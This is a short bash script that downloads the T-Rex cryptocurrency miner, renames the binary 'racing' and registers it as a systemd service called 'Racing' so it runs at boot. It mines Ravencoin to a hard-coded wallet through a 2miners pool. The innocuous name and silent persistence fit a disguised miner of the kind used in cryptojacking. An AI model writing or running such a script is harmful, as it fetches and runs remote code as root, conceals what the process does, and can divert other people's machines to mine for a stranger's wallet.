sudo wget https://github.com/trexminer/T-Rex/releases/download/0.25.12/t-rex-0.25.12-linux.tar.gz
sudo tar -zxvf t-rex-0.25.12-linux.tar.gz
sudo mv t-rex racing
sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing -a kawpow -o us-solo-rvn.2miners.com:7070 -u RN9dnTPV1voDLtwS6v6ap7Az9y8BtEnBAs.solo1 -p x\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
sudo systemctl daemon-reload
sudo systemctl enable racing.service
sudo screen ./racing -a kawpow -o us-solo-rvn.2miners.com:7070 -u RN9dnTPV1voDLtwS6v6ap7Az9y8BtEnBAs.solo1 -p x &
